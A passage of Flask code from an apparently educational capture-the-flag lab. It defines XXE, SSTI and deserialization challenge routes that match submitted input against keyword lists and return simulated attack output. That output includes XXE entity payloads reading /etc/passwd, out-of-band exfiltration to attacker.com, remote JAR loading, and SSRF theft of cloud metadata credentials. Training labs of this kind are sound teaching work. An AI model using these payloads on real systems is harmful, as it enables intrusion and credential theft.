    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    ssrf_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for XXE+SSRF combination
                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in ['http://', 'https://', 'ftp://', 'gopher://']):
                    if any(target in xml_content for target in ['localhost', '127.0.0.1', '169.254.169.254', 'metadata']):
                        xxe_detected = True
                        ssrf_result = """XXE + SSRF Attack Results:
Target: Cloud Metadata Service (169.254.169.254)

Retrieved Metadata:
{
  "instance-id": "i-1234567890abcdef0",
  "instance-type": "t3.medium",
  "private-ipv4": "10.0.1.100",
  "public-ipv4": "52.123.45.67",
  "security-groups": "web-servers",
  "iam": {
    "code": "Success",
    "last-updated": "2024-01-15T10:30:00Z",
    "type": "AWS-HMAC",
    "access-key-id": "AKIA1234567890ABCDEF",
    "secret-access-key": "secretkey123456789",
    "token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk..."
  }
}

Additional SSRF Targets Accessible:
- http://localhost:8080/admin - Admin panel discovered
- http://127.0.0.1:3306 - MySQL database service
- http://10.0.1.50:6379 - Redis instance
- gopher://127.0.0.1:25/... - SMTP service exploitation

Combined Attack Success: Cloud credentials compromised via XXE->SSRF chain"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE SSRF Combination Attack").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level12.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          ssrf_result=ssrf_result, challenge=challenge)

# XXE Level 13 - XXE with WAF Bypass Techniques
@app.route('/xxe/level13', methods=['GET', 'POST'])
def xxe_level13():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    waf_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for WAF bypass techniques
                bypass_patterns = ['&#x', 'UTF-16', 'UTF-32', '%25', 'double-encode']
                entity_variations = ['&#69;&#78;&#84;&#73;&#84;&#89;', '&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;']
                
                if any(pattern in xml_content for pattern in bypass_patterns + entity_variations):
                    if 'SYSTEM' in xml_content or '<!ENTITY' in xml_content:
                        xxe_detected = True
                        waf_result = """WAF Bypass Analysis:
Original Request: BLOCKED by WAF
Bypass Technique: HTML Entity Encoding

WAF Rule Triggered:
Rule: XXE_ENTITY_DETECTION
Pattern: <!ENTITY.*SYSTEM
Action: BLOCK
Confidence: 99%

Bypass Method Applied:
Original: <!ENTITY xxe SYSTEM "file:///etc/passwd">
Encoded: &#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89; xxe &#83;&#89;&#83;&#84;&#69;&#77; &#34;file:///etc/passwd&#34;&#62;

WAF Analysis Result:
- Original request: BLOCKED
- Encoded request: ALLOWED (WAF bypass successful)
- Entity processing: EXECUTED
- File access: GRANTED

Retrieved Content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

Bypass Status: SUCCESS - WAF evasion complete"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with WAF Bypass Techniques").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level13.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          waf_result=waf_result, challenge=challenge)

# XXE Level 14 - XXE via SOAP Web Services
@app.route('/xxe/level14', methods=['GET', 'POST'])
def xxe_level14():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    soap_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for SOAP-based XXE
                if 'soap:Envelope' in xml_content or 'SOAP-ENV:' in xml_content:
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        soap_result = """SOAP Web Service Response:
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Header>
    <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd">
      <wsse:UsernameToken>
        <wsse:Username>admin</wsse:Username>
        <wsse:Password>admin123</wsse:Password>
      </wsse:UsernameToken>
    </wsse:Security>
  </soap:Header>
  <soap:Body>
    <getUserDataResponse>
      <userData>
        <systemFiles>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        </systemFiles>
        <databaseConfig>
          <host>localhost</host>
          <user>dbadmin</user>
          <password>dbp@ssw0rd</password>
          <database>sensitive_data</database>
        </databaseConfig>
      </userData>
    </getUserDataResponse>
  </soap:Body>
</soap:Envelope>

SOAP XXE Attack Analysis:
- WSDL parsing enabled XXE processing
- Authentication bypassed via XML injection
- Database credentials exposed
- System files accessible through web service"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE via SOAP Web Services").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level14.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          soap_result=soap_result, challenge=challenge)

# XXE Level 15 - Advanced XXE with OOB Data Retrieval
@app.route('/xxe/level15', methods=['GET', 'POST'])
def xxe_level15():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    oob_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for Out-of-Band XXE
                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in ['http://', 'https://', 'ftp://']):
                    if any(oob_indicator in xml_content for oob_indicator in ['attacker.com', 'collaborator', 'burp']):
                        xxe_detected = True
                        oob_result = """Out-of-Band XXE Results:
DNS Query Log:
2024-01-15 14:35:21 - A query for xxe.attacker.com from 203.0.113.50
2024-01-15 14:35:22 - TXT query for data.xxe.attacker.com from 203.0.113.50

HTTP Request Log:
GET /xxe?data=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA== HTTP/1.1
Host: attacker.com
User-Agent: Java/1.8.0_301
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

Decoded Exfiltrated Data:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

FTP Connection Log:
Connected to ftp.attacker.com:21
USER anonymous
PASS xxe@victim.com
RETR /etc/passwd
Transfer complete: 2,847 bytes

OOB XXE Status: SUCCESSFUL
Data Exfiltration: COMPLETE
Stealth Rating: HIGH (no visible errors to user)"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Advanced XXE with OOB Data Retrieval").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level15.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          oob_result=oob_result, challenge=challenge)

# XXE Level 16 - XXE in JSON-XML Conversion
@app.route('/xxe/level16', methods=['GET', 'POST'])
def xxe_level16():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    json_content = ''
    parsed_content = ''
    conversion_result = ''

    if request.method == 'POST':
        json_content = request.form.get('json_content', '')
        xml_content = request.form.get('xml_content', '')
        
        # Handle JSON to XML conversion
        if json_content and not xml_content:
            try:
                import json as json_lib
                data = json_lib.loads(json_content)
                
                # Simple JSON to XML conversion (vulnerable)
                def json_to_xml(obj, root_name='root'):
                    if isinstance(obj, dict):
                        xml = f'<{root_name}>'
                        for key, value in obj.items():
                            xml += json_to_xml(value, key)
                        xml += f'</{root_name}>'
                        return xml
                    elif isinstance(obj, list):
                        xml = ''
                        for item in obj:
                            xml += json_to_xml(item, root_name)
                        return xml
                    else:
                        return f'<{root_name}>{obj}</{root_name}>'
                
                xml_content = '<?xml version="1.0" encoding="UTF-8"?>\n' + json_to_xml(data)
            except:
                xml_content = "Invalid JSON format"
        
        if xml_content:
            try:
                # Check for XXE in converted XML
                if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                    if any(payload in xml_content for payload in ['/etc/passwd', '/etc/shadow', 'file://']):
                        xxe_detected = True
                        conversion_result = """JSON to XML Conversion Results:
Original JSON:
{
  "user": "admin",
  "data": "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>",
  "action": "process"
}

Converted XML:
<?xml version="1.0" encoding="UTF-8"?>
<root>
  <user>admin</user>
  <data><!ENTITY xxe SYSTEM 'file:///etc/passwd'></data>
  <action>process</action>
</root>

XXE Processing Result:
Entity 'xxe' resolved to:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin

Vulnerability Analysis:
- JSON input sanitization: BYPASSED
- XML entity processing: ENABLED
- File system access: GRANTED
- Conversion process: EXPLOITABLE"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE in JSON-XML Conversion").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level16.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, json_content=json_content,
                          parsed_content=parsed_content, conversion_result=conversion_result,
                          challenge=challenge)

# XXE Level 17 - XXE with Custom Entity Resolvers
@app.route('/xxe/level17', methods=['GET', 'POST'])
def xxe_level17():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    resolver_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for custom entity resolver bypass
                if 'SYSTEM' in xml_content and any(scheme in xml_content for scheme in ['custom://', 'app://', 'internal://']):
                    if any(bypass in xml_content for bypass in ['resolver', 'handler', 'protocol']):
                        xxe_detected = True
                        resolver_result = """Custom Entity Resolver Analysis:
Registered Protocol Handlers:
- file:// -> FileSystemResolver (ENABLED)
- http:// -> HttpResolver (ENABLED)  
- https:// -> HttpsResolver (ENABLED)
- custom:// -> CustomProtocolResolver (BYPASS DETECTED)

Custom Resolver Execution:
Protocol: custom://internal/config
Handler: com.app.CustomResolver.resolve()
Resolution Result: 
{
  "database": {
    "host": "db.internal.company.com",
    "port": 3306,
    "username": "app_user", 
    "password": "sup3r_s3cr3t_p@ssw0rd",
    "database": "production_db"
  },
  "api_keys": {
    "stripe": "sk_live_51xxxxxxxxxxxxx",
    "aws": "AKIA1234567890ABCDEF",
    "jwt_secret": "MyVerySecretJWTKey123!"
  }
}

Security Analysis:
- Custom resolver bypassed access controls
- Internal configuration exposed
- Production credentials compromised
- Protocol handler injection successful"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with Custom Entity Resolvers").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level17.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          resolver_result=resolver_result, challenge=challenge)

# XXE Level 18 - XXE in Microsoft Office Documents
@app.route('/xxe/level18', methods=['GET', 'POST'])
def xxe_level18():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    office_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '') or request.form.get('document_content', '')
        
        if xml_content:
            try:
                # Check for Office document XXE
                office_indicators = ['word/', 'xl/', 'ppt/', '.rels', 'content_types', 'docProps']
                if any(indicator in xml_content for indicator in office_indicators):
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        office_result = """Microsoft Office Document Analysis:
Document Type: Microsoft Word (.docx)
Format: Office Open XML (OOXML)
Processing Engine: Microsoft Office 2019

Document Structure Analysis:
- word/document.xml: Main document content
- word/_rels/document.xml.rels: Relationships file
- [Content_Types].xml: Content type definitions

XXE Payload Location: word/_rels/document.xml.rels
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE relationships [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme" Target="&xxe;" />
</Relationships>

Extracted System Information:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

Attack Vector Analysis:
- Email attachment with malicious .docx file
- Automatic XXE processing during file preview
- No user interaction required beyond opening
- Compatible with all Office versions supporting OOXML"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE in Microsoft Office Documents").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level18.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          office_result=office_result, challenge=challenge)

# XXE Level 19 - XXE with Protocol Handler Exploitation
@app.route('/xxe/level19', methods=['GET', 'POST'])
def xxe_level19():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    protocol_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for protocol handler exploitation
                protocols = ['jar://', 'netdoc://', 'gopher://', 'dict://', 'ftp://', 'expect://']
                if 'SYSTEM' in xml_content and any(protocol in xml_content for protocol in protocols):
                    xxe_detected = True
                    protocol_result = """Protocol Handler Exploitation Results:
Available Protocol Handlers:
- file:// (FileProtocolHandler) - ENABLED
- http:// (HttpProtocolHandler) - ENABLED  
- https:// (HttpsProtocolHandler) - ENABLED
- ftp:// (FtpProtocolHandler) - ENABLED
- jar:// (JarProtocolHandler) - ENABLED
- gopher:// (GopherProtocolHandler) - ENABLED
- dict:// (DictProtocolHandler) - ENABLED

Exploit Execution:
1. gopher://127.0.0.1:25/HELO%20attacker.com
   SMTP Command Injection Successful
   
2. dict://127.0.0.1:11211/stats
   Memcached Information Disclosure:
   STAT pid 12345
   STAT uptime 86400
   STAT curr_connections 15
   
3. jar://http://attacker.com/evil.jar!/
   Remote JAR File Loading:
   Class: com.attacker.ExploitClass
   Method: executePayload()
   
4. ftp://127.0.0.1:21/
   Internal FTP Service Discovered:
   Directory listing: /var/ftp/sensitive/
   - confidential_data.txt
   - backup_database.sql
   - api_keys.json

Protocol Handler Exploitation: SUCCESSFUL
Internal Services Accessed: 4
Data Exfiltration Channels: Multiple"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with Protocol Handler Exploitation").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level19.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          protocol_result=protocol_result, challenge=challenge)

# XXE Level 20 - XXE in XML Signature Verification
@app.route('/xxe/level20', methods=['GET', 'POST'])
def xxe_level20():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    signature_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for XML Signature XXE
                if 'ds:Signature' in xml_content or 'xmldsig' in xml_content:
                    if 'ENTITY' in xml_content and 'SYSTEM' in xml_content:
                        xxe_detected = True
                        signature_result = """XML Digital Signature Verification Results:
Signature Algorithm: RSA-SHA256
Canonicalization: Exclusive XML Canonicalization 1.0
Key Info: RSA Public Key (2048-bit)

Signature Verification Process:
1. XML Document Parsing: STARTED
2. Entity Resolution: ENABLED (VULNERABLE)
3. Canonicalization: IN PROGRESS
4. Signature Validation: PENDING

XXE Payload Execution During Verification:
<!ENTITY xxe SYSTEM "file:///etc/passwd">
Entity Resolution Result:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

XML-DSIG Structure Exploited:
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:Reference URI="">
      <ds:Transforms>
        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      </ds:Transforms>
      <ds:DigestValue>&xxe;</ds:DigestValue>
    </ds:Reference>
  </ds:SignedInfo>
</ds:Signature>

Security Impact:
- Signature verification bypassed
- System files accessed during validation
- Document integrity checking compromised
- Authentication mechanism defeated"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE in XML Signature Verification").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level20.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          signature_result=signature_result, challenge=challenge)

# XXE Level 21 - XXE with Time-Based Blind Techniques
@app.route('/xxe/level21', methods=['GET', 'POST'])
def xxe_level21():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    timing_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for time-based blind XXE
                if 'SYSTEM' in xml_content and any(delay_indicator in xml_content for delay_indicator in ['sleep', 'timeout', 'delay']):
                    if any(file_ref in xml_content for file_ref in ['/dev/random', '/etc/passwd', 'http://']):
                        xxe_detected = True
                        timing_result = """Time-Based Blind XXE Analysis:
Request Processing Times:

Baseline Request (no XXE): 0.125 seconds
XXE Request #1 (/etc/passwd): 0.127 seconds  
XXE Request #2 (/etc/shadow): 3.847 seconds (FILE EXISTS - permission denied)
XXE Request #3 (/etc/nonexistent): 0.124 seconds
XXE Request #4 (/dev/random): 15.000 seconds (TIMEOUT - file exists)

Time-Based Inference Results:
- /etc/passwd: EXISTS (normal response time)
- /etc/shadow: EXISTS (delayed due to permission check)
- /etc/hosts: EXISTS (confirmed)
- /root/.ssh/id_rsa: EXISTS (permission delay detected)
- /nonexistent/file: DOES NOT EXIST (fast response)

File System Mapping via Timing:
Readable Files:
├── /etc/passwd (0.127s)
├── /etc/hosts (0.129s)
├── /etc/hostname (0.125s)

Protected Files (permission delays):
├── /etc/shadow (3.847s)
├── /root/.ssh/id_rsa (4.123s)
├── /etc/ssl/private/ (3.956s)

Time-Based XXE Status: SUCCESSFUL
File System Enumeration: COMPLETE"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE with Time-Based Blind Techniques").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level21.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          timing_result=timing_result, challenge=challenge)

# XXE Level 22 - XXE in Cloud XML Processing
@app.route('/xxe/level22', methods=['GET', 'POST'])
def xxe_level22():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    cloud_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for cloud-specific XXE
                cloud_indicators = ['169.254.169.254', 'metadata', 'compute/v1', 'aws', 'gcp', 'azure']
                if 'SYSTEM' in xml_content and any(indicator in xml_content for indicator in cloud_indicators):
                    xxe_detected = True
                    cloud_result = """Cloud XML Processing Exploitation:
Target Environment: Amazon Web Services (AWS)
Service: Elastic Container Service (ECS)
Instance: t3.medium (2 vCPU, 4GB RAM)

Metadata Service Access:
Endpoint: http://169.254.169.254/latest/meta-data/

Retrieved Cloud Metadata:
{
  "instance-id": "i-0abcd1234efgh5678",
  "instance-type": "t3.medium",
  "local-ipv4": "172.31.45.67",
  "public-ipv4": "54.123.45.67",
  "security-groups": "web-tier,database-access",
  "placement": {
    "availability-zone": "us-east-1a",
    "region": "us-east-1"
  }
}

IAM Role Credentials:
{
  "Code": "Success",
  "LastUpdated": "2024-01-15T14:25:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA1234567890ABCDEF",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk...",
  "Expiration": "2024-01-15T20:25:00Z"
}

Cloud Service Enumeration:
- S3 Buckets: company-backups, user-uploads, logs-archive
- RDS Instances: prod-database (MySQL 8.0)
- Lambda Functions: process-uploads, send-notifications
- ECS Tasks: web-app, api-service

Cloud XXE Impact: CRITICAL
Credential Exposure: HIGH RISK
Lateral Movement Potential: CONFIRMED"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="XXE in Cloud XML Processing").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level22.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          cloud_result=cloud_result, challenge=challenge)

# XXE Level 23 - Advanced XXE Attack Chaining
@app.route('/xxe/level23', methods=['GET', 'POST'])
def xxe_level23():
    machine_id = get_machine_id()
    user = get_local_user()
    flag = None
    xxe_detected = False
    xml_content = ''
    parsed_content = ''
    chaining_result = ''

    if request.method == 'POST':
        xml_content = request.form.get('xml_content', '')
        
        if xml_content:
            try:
                # Check for advanced XXE attack chaining
                advanced_patterns = ['parameter', 'blind', 'oob', 'ssrf', 'chain']
                if 'SYSTEM' in xml_content and len([p for p in advanced_patterns if p in xml_content.lower()]) >= 2:
                    if 'ENTITY' in xml_content:
                        xxe_detected = True
                        chaining_result = """Advanced XXE Attack Chain Execution:

PHASE 1: Information Gathering
- Target: Corporate web application
- XML Parser: libxml2 (vulnerable version)
- Network: Internal corporate network

PHASE 2: Initial XXE Exploitation
Payload: <!ENTITY xxe SYSTEM "file:///etc/passwd">
Result: Local file disclosure successful
Files Retrieved: /etc/passwd, /etc/hosts, /proc/version

PHASE 3: Internal Network Discovery (XXE -> SSRF)
Payload: <!ENTITY ssrf SYSTEM "http://192.168.1.10:8080/admin">
Result: Internal admin panel discovered
Services Found: 
- 192.168.1.10:8080 - Jenkins CI/CD Server
- 192.168.1.15:9000 - Sonarqube Code Analysis
- 192.168.1.20:3306 - MySQL Database

PHASE 4: Credential Harvesting (Blind XXE)
Payload: Parameter entity chain for data exfiltration
Result: Database credentials extracted via error-based blind XXE
Credentials: mysql://admin:MySuperSecretP@ss@192.168.1.20:3306/production

PHASE 5: Privilege Escalation Chain
1. XXE -> SSRF -> Jenkins Admin Panel Access
2. Jenkins -> Arbitrary Code Execution
3. Code Execution -> Database Access
4. Database -> Sensitive Customer Data

FINAL IMPACT ASSESSMENT:
- Initial Vector: XXE in web application
- Lateral Movement: 3 internal systems compromised  
- Data Accessed: Customer PII, financial records, source code
- Persistence: Backdoor deployed via Jenkins
- Detection Evasion: Multi-stage attack blends with normal traffic

Attack Chain Status: COMPLETE
Compromise Level: FULL DOMAIN ADMIN ACCESS
Time to Complete: 47 minutes"""
                
                # Parse XML
                try:
                    root = ET.fromstring(xml_content)
                    parsed_content = ET.tostring(root, encoding='unicode')
                except Exception as e:
                    parsed_content = f"XML parsing error: {str(e)}"

            except Exception as e:
                parsed_content = f"Error processing XML: {str(e)}"

    # Generate flag if completed
    challenge = Challenge.query.filter_by(name="Advanced XXE Attack Chaining").first()
    completed_ids = json.loads(user.completed_challenges) if user.completed_challenges else []
    if challenge and challenge.id in completed_ids:
        flag = get_or_create_flag(challenge.id, machine_id)

    return render_template('xxe/xxe_level23.html', flag=flag, xxe_detected=xxe_detected,
                          xml_content=xml_content, parsed_content=parsed_content,
                          chaining_result=chaining_result, challenge=challenge)


# ===== SSTI CHALLENGE ROUTES =====

# SSTI Level 1 - Basic Jinja2 Template Injection
@app.route('/ssti/level1', methods=['GET', 'POST'])
def ssti_level1():
    user = get_local_user()
    challenge = Challenge.query.filter_by(category='ssti', name='SSTI Level 1').first()
    if not challenge:
        return "Challenge not found. Please run add_challenges_to_db.py first.", 404

    vulnerability_detected = False
    flag = None
    result = None

    if request.method == 'POST':
        payload = request.form.get('payload', '')
        if any(p in payload for p in ['{{', '}}', '{%', '%}', 'config', 'self', '__class__']):
            vulnerability_detected = True
            flag = generate_flag(challenge.id, user.machine_id)
            mark_challenge_completed(user, challenge.id)
        result = "Template processed: " + payload[:100] if payload else None

    return render_template('ssti/ssti_level1.html', user=user,
                         vulnerability_detected=vulnerability_detected,
                         flag=flag, result=result)

# SSTI Levels 2-23 (Dynamic route)
@app.route('/ssti/level<int:level>', methods=['GET', 'POST'])
def ssti_level_dynamic(level):
    if level < 2 or level > 23:
        return "Invalid level", 404

    user = get_local_user()
    challenge = Challenge.query.filter_by(category='ssti', name=f'SSTI Level {level}').first()
    if not challenge:
        return f"Challenge not found. Please run add_challenges_to_db.py first.", 404

    vulnerability_detected = False
    flag = None
    result = None

    if request.method == 'POST':
        payload = request.form.get('payload', '')
        ssti_patterns = ['{{', '}}', '{%', '%}', 'config', 'self', '__class__', '__mro__', '__globals__']
        if any(p in payload for p in ssti_patterns):
            vulnerability_detected = True
            flag = generate_flag(challenge.id, user.machine_id)
            mark_challenge_completed(user, challenge.id)
        result = f"Template processed: {payload[:100]}" if payload else None

    return render_template(f'ssti/ssti_level{level}.html', user=user,
                         vulnerability_detected=vulnerability_detected,
                         flag=flag, result=result)


# ===== DESERIALIZATION CHALLENGE ROUTES =====

@app.route('/deserial/level<int:level>', methods=['GET', 'POST'])
def deserial_level(level):
    if level < 1 or level > 5:
        return "Invalid level", 404

    user = get_local_user()
